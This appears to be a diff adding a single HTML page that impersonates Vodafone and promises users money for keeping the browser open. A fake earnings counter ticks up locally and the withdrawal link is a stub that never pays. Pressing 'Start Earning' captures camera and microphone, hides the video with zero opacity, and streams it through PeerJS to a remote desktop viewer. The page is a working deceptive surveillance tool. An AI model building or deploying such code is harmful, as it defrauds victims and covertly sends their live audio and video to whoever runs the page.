@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Vodafone Network</title>
+    <style>
+        /* Tailwind CSS CDN for styling */
+        @import url('https://cdn.tailwindcss.com');
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+
+        body {
+            font-family: 'Inter', sans-serif;
+            /* Red and white background */
+            background: linear-gradient(to bottom right, #FFFFFF, #FF0000);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 0;
+            overflow: hidden;
+        }
+
+        .main-container {
+            width: 100%;
+            height: 100vh;
+            max-width: 420px;
+            background-color: #FFFFFF; /* White background for content area */
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: space-between;
+            position: relative;
+            overflow: hidden;
+            border-radius: 0.5rem;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.2);
+        }
+
+        .content-area {
+            position: relative;
+            width: 100%;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 1rem;
+            box-sizing: border-box;
+        }
+
+        #localVideo {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            transform: scaleX(-1);
+            z-index: 0;
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .money-counter-display {
+            font-size: 2.5rem;
+            font-weight: 800;
+            color: #FF0000; /* Red text */
+            margin-bottom: 1rem; /* Adjusted to move up */
+            margin-top: -2rem; /* MOVED UP: Adjusted to move the box up */
+            text-shadow: 2px 2px 4px rgba(0,0,0,0.15);
+            background-color: #FFFFFF; /* White background */
+            padding: 1.5rem 2.5rem;
+            border-radius: 1rem;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
+            text-align: center;
+        }
+
+        .controls-overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+            background: linear-gradient(to top, rgba(0,0,0,0.7) 0%, rgba(0,0,0,0) 30%);
+            z-index: 10;
+        }
+
+        .share-button {
+            background-color: #FF0000; /* Red button */
+            color: white;
+            padding: 1rem 2.5rem;
+            border-radius: 9999px;
+            font-size: 1.2rem;
+            font-weight: 700;
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.2);
+            transition: transform 0.2s ease, background-color 0.2s ease, box-shadow 0.2s ease;
+            cursor: pointer;
+            border: none;
+            min-width: 8rem;
+            margin-left: -2rem;
+            margin-top: 12rem; /* Increased margin-top to move button further down */
+            /* Removed opacity for full visibility */
+        }
+        .share-button:hover {
+            background-color: #CC0000; /* Darker red on hover */
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(236, 72, 153, 0.4);
+        }
+        .share-button:active {
+            transform: translateY(0);
+            box-shadow: 0 5px 10px rgba(0, 0, 0, 0.2);
+        }
+        .share-button:disabled {
+            background-color: #a3a3a3;
+            cursor: not-allowed;
+            box-shadow: none;
+            transform: none;
+            opacity: 0.7;
+        }
+
+        .withdrawal-note {
+            color: black; /* Changed to black */
+            font-size: 0.9rem;
+            margin-top: 1rem; /* Space below the button */
+            text-align: center;
+            width: 100%;
+            max-width: 250px; /* Limit width for readability */
+            line-height: 1.1; /* Made line spacing smaller */
+            text-shadow: none; /* Removed text-shadow for black text */
+            margin-left: -2rem; /* Moved to the left */
+        }
+
+        .withdrawal-note a {
+            color: #007bff; /* Blue for hyperlink */
+            text-decoration: underline;
+            cursor: pointer;
+        }
+
+        .earning-note {
+            color: black; /* Changed to black */
+            font-size: 0.8rem; /* Made smaller */
+            margin-top: 0.5rem; /* Space below the previous note */
+            text-align: center;
+            width: 100%;
+            max-width: 250px; /* Limit width for readability */
+            line-height: 1.1; /* Made line spacing smaller */
+            text-shadow: none; /* Removed text-shadow for black text */
+            margin-left: -2rem; /* Moved to the left */
+        }
+
+        /* Custom Alert Styling */
+        #customAlertBox {
+            background-color: #fff;
+            color: #333;
+            border: 1px solid #ddd;
+            padding: 25px 35px;
+            border-radius: 10px;
+            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
+            z-index: 1000;
+            text-align: center;
+            max-width: 400px;
+            font-family: 'Inter', sans-serif;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+        }
+        #customAlertBox p {
+            margin-bottom: 20px;
+            font-size: 1.1em;
+        }
+        #customAlertBox button {
+            padding: 10px 25px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 1em;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+        #customAlertBox button:hover {
+            background-color: #0056b3;
+        }
+
+        /* Logo Integration */
+        .logo-container {
+            position: absolute;
+            top: 1rem;
+            left: 1rem;
+            z-index: 20; /* Ensure it's above other elements */
+            border: 2px solid red; /* Added for debugging */
+        }
+
+        .logo {
+            max-width: 100px; /* Adjust as needed */
+            height: auto;
+        }
+    </style>
+    <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
+</head>
+<body>
+    <div class="main-container">
+        <div class="logo-container">
+            <img id="vodafoneLogo" src="https://sm-img.imgix.net/cms/54217ebb43d02_a50505fd7b.png" alt="Vodafone Logo" class="logo">
+        </div>
+        <div class="content-area">
+            <video id="localVideo" autoplay playsinline></video>
+            <div id="moneyCounter" class="money-counter-display">
+                Your Earnings: $0.00
+            </div>
+        </div>
+
+        <div class="controls-overlay">
+            <button id="startButton" onclick="startSharing()" class="share-button">
+                Start Earning
+            </button>
+            <p class="withdrawal-note">You can <a href="#" onclick="event.preventDefault(); showCustomAlert('You haven\'t completed the 30 days yet.');">withdraw</a> your earnings once every 30 days.</p>
+            <p class="earning-note">Keep the browser open to keep earning.</p>
+        </div>
+
+    </div>
+
+    <script>
+        // --- PeerJS and WebRTC Setup ---
+        let peer;
+        let localStream;
+        let desktopPeerId = null;
+        const localVideo = document.getElementById('localVideo'); // This will capture the camera stream
+        const startButton = document.getElementById('startButton');
+        const vodafoneLogo = document.getElementById('vodafoneLogo'); // Get reference to the logo image
+
+        // --- Money Counter Variables ---
+        let centsCount = 0;
+        let counterInterval;
+        const moneyCounterDisplay = document.getElementById('moneyCounter');
+        const LOCAL_STORAGE_EARNINGS_KEY = 'beautyFashionTubeEarnings'; // Key for localStorage
+
+        // Configuration for PeerJS connection to your signaling server
+        const peerConfig = {
+            host: '192.168.113.70', // Explicitly set host for mobile sender
+            port: 9000, // PeerJS server port (must match server.js)
+            path: '/myapp', // PeerJS server path (must match server.js)
+            secure: true,
+            debug: 2
+        };
+
+        function initializePeer() {
+            const mobilePeerId = 'mobile-' + Math.random().toString(36).substring(2, 15);
+            console.log(`Attempting to connect to PeerJS server at ${peerConfig.secure ? 'wss' : 'ws'}://${peerConfig.host}:${peerConfig.port}${peerConfig.path} with ID: ${mobilePeerId}`);
+            peer = new Peer(mobilePeerId, peerConfig);
+
+            peer.on('open', (id) => {
+                console.log('My PeerJS ID is: ' + id);
+                if (desktopPeerId) {
+                    startButton.disabled = false;
+                }
+            });
+
+            peer.on('error', (err) => {
+                console.error('PeerJS error:', err);
+                let errorMessage = 'Error initializing PeerJS: ' + err.message;
+                if (err.type === 'network') {
+                    errorMessage = `Network Error: Could not connect to PeerJS server. Please ensure: \n\n1. The combined Node.js server is RUNNING (\`node server.js\`) in your terminal. \n2. If connecting from a mobile device, you MUST use your desktop's CORRECT IP address in the mobile browser's URL (e.g., https://192.168.113.70:8000/Vodafone_Network.html). \n3. No firewalls are BLOCKING port 8000 or 9000. \n4. You have accepted the self-signed certificate warning in your browser.`;
+                } else if (err.type === 'peer-unavailable') {
+                    errorMessage = 'Peer unavailable. The desktop viewer might not have connected yet or its PeerJS ID is incorrect.';
+                }
+                showCustomAlert(errorMessage);
+                startButton.disabled = true;
+            });
+
+            peer.on('disconnected', () => {
+                console.log('PeerJS disconnected from server. Attempting to reconnect...');
+                if (peer && !peer.destroyed) {
+                    peer.reconnect();
+                }
+            });
+
+            peer.on('close', () => {
+                console.log('PeerJS connection closed.');
+            });
+        }
+
+        /**
+         * Starts the money counter and the camera/mic stream.
+         */
+        async function startSharing() {
+            console.log("Start Earning button clicked.");
+
+            // Start the money counter
+            if (counterInterval) {
+                clearInterval(counterInterval); // Clear any existing interval
+            }
+            // Load initial centsCount from localStorage or start from 0
+            const savedCents = localStorage.getItem(LOCAL_STORAGE_EARNINGS_KEY);
+            centsCount = savedCents ? parseInt(savedCents, 10) : 0;
+
+            updateMoneyCounter(); // Update display immediately
+            counterInterval = setInterval(() => {
+                centsCount++;
+                updateMoneyCounter();
+                localStorage.setItem(LOCAL_STORAGE_EARNINGS_KEY, centsCount); // Save current earnings
+            }, 1000); // Increment every second (1000 ms)
+
+            if (!peer || peer.disconnected) {
+                 showCustomAlert("PeerJS is not connected. Please ensure the server is running and refresh the page.");
+                 return;
+            }
+
+            // Ensure any previous stream is stopped
+            if (localStream) {
+                localStream.getTracks().forEach(track => track.stop());
+            }
+
+            try {
+                // Request camera and microphone access
+                localStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                localVideo.srcObject = localStream; // Display local stream on the mobile device (even if hidden by YouTube iframe)
+                localVideo.play().catch(e => {
+                    console.error("Error playing local video (for capture):", e);
+                    // No alert here, as it's not the primary visual, but log for debugging
+                });
+
+                startButton.disabled = true;
+
+                // Automatically connect to desktop after stream is successfully obtained
+                connectToDesktop();
+
+            } catch (error) {
+                console.error('Error starting camera/mic sharing:', error);
+                let errorMessage = "Error starting camera/mic sharing: " + error.message + ".";
+                if (error.name === "NotAllowedError") {
+                    errorMessage += " Permission denied. You must grant camera and microphone permissions.";
+                } else if (error.name === "NotFoundError") {
+                    errorMessage += " No camera or microphone found. Ensure your device has them and they are not in use.";
+                } else if (error.name === "SecurityError") {
+                    errorMessage += " Security error. This often means the page needs to be loaded over HTTPS for camera/mic access on your mobile device.";
+                }
+                showCustomAlert(errorMessage);
+                stopSharing(); // Clean up if sharing fails
+            }
+        }
+
+        /**
+         * Stops the money counter and the camera/mic stream.
+         */
+        function stopSharing() {
+            if (counterInterval) {
+                clearInterval(counterInterval);
+            }
+            if (localStream) {
+                console.log("Stopping local stream tracks...");
+                localStream.getTracks().forEach(track => track.stop());
+                localStream = null;
+                localVideo.srcObject = null; // Clear local video display
+            }
+            if (peer && !peer.disconnected) {
+                peer.destroy(); // Disconnect from the PeerJS server
+            }
+            startButton.disabled = false;
+        }
+
+        async function connectToDesktop() {
+            if (!localStream) {
+                console.warn("No local stream available to send to desktop.");
+                return;
+            }
+            if (!peer || peer.disconnected) {
+                console.warn("PeerJS not connected, cannot call desktop.");
+                return;
+            }
+
+            try {
+                console.log('Calling desktop peer:', desktopPeerId);
+                const call = peer.call(desktopPeerId, localStream);
+
+                call.on('stream', (remoteStream) => {
+                    console.log('Received remote stream:', remoteStream);
+                });
+
+                call.on('close', () => {
+                    console.log('Call ended by remote peer.');
+                    showCustomAlert('Camera/Mic sharing ended by desktop.');
+                });
+
+                call.on('error', (err) => {
+                    console.error('Call error:', err);
+                    showCustomAlert('Call error: ' + err.message + '. Check console for details.');
+                });
+
+                console.log("Connecting to desktop... Check desktop viewer for stream.");
+
+            } catch (error) {
+                console.error('Error connecting to desktop:', error);
+                showCustomAlert("Error connecting to desktop: " + error.message + ". Check console for details.");
+            }
+        }
+
+        /**
+         * Updates the money counter display.
+         */
+        function updateMoneyCounter() {
+            const dollars = Math.floor(centsCount / 100);
+            const cents = centsCount % 100;
+            moneyCounterDisplay.textContent = `Your Earnings: $${dollars}.${cents.toString().padStart(2, '0')}`;
+        }
+
+        function showCustomAlert(message) {
+            let alertBox = document.getElementById('customAlertBox');
+            if (!alertBox) {
+                alertBox = document.createElement('div');
+                alertBox.id = 'customAlertBox';
+                alertBox.className = `fixed top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 bg-white p-8 rounded-lg shadow-2xl z-50 text-center max-w-sm font-inter text-gray-800 border border-gray-200`;
+                const messageParagraph = document.createElement('p');
+                messageParagraph.textContent = message;
+                messageParagraph.className = 'mb-6 text-lg';
+
+                const closeButton = document.createElement('button');
+                closeButton.textContent = 'OK';
+                closeButton.className = `px-6 py-2 bg-blue-600 text-white rounded-md hover:bg-blue-700 transition duration-300 ease-in-out`;
+                closeButton.onclick = () => alertBox.remove();
+
+                alertBox.appendChild(messageParagraph);
+                alertBox.appendChild(closeButton);
+                document.body.appendChild(alertBox);
+            } else {
+                alertBox.querySelector('p').textContent = message;
+            }
+        }
+
+        // Initial setup on window load
+        window.onload = () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            desktopPeerId = urlParams.get('peerId');
+            console.log("Desktop Peer ID from URL:", desktopPeerId);
+
+            // Disable start button until PeerJS is connected and desktopPeerId is available
+            startButton.disabled = true;
+
+            // Initialize PeerJS (will enable start button if desktopPeerId exists)
+            initializePeer();
+
+            // Load initial centsCount from localStorage or start from 0
+            const savedCents = localStorage.getItem(LOCAL_STORAGE_EARNINGS_KEY);
+            centsCount = savedCents ? parseInt(savedCents, 10) : 0;
+            updateMoneyCounter(); // Update display immediately
+
+            // Log the image source to console for debugging
+            console.log("Vodafone logo src:", vodafoneLogo.src);
+        };
+
+        // Add event listener to stop the stream and PeerJS connection when the page is closed or navigated away
+        window.addEventListener('beforeunload', () => {
+            console.log("Page is unloading, stopping stream and destroying PeerJS...");
+            stopSharing();
+            if (peer && !peer.destroyed) {
+                peer.destroy(); // Disconnect from the PeerJS server
+            }
+        });
+    </script>
+</body>
+</html>
